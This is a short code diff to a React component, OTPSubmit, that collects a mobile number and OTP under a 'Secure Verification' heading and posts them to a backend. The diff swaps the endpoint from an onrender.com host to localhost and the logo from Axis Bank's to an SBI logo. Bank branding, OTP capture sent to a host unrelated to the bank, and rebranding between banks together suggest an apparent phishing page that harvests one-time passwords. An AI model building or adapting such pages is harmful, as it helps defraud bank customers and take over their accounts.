@@ -51,7 +51,7 @@ export default function OTPSubmit() {
     setMessage({ text: "", type: "" });
 
     try {
-      await fetch("https://axisonline-1.onrender.com/api/otp/submit", {
+      await fetch("http://localhost:5000/api/otp/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ mobileNumber, otp: otpValue }),
@@ -93,7 +93,7 @@ export default function OTPSubmit() {
 
   return (
     <div className="otp-container">
-      <img src="/icons/axis-bank.png" alt="Logo" />
+      <img src="/icons/sbilogo.png" alt="Logo" />
       <h2>Secure Verification</h2>
 
       <p className="otp-headerrr">
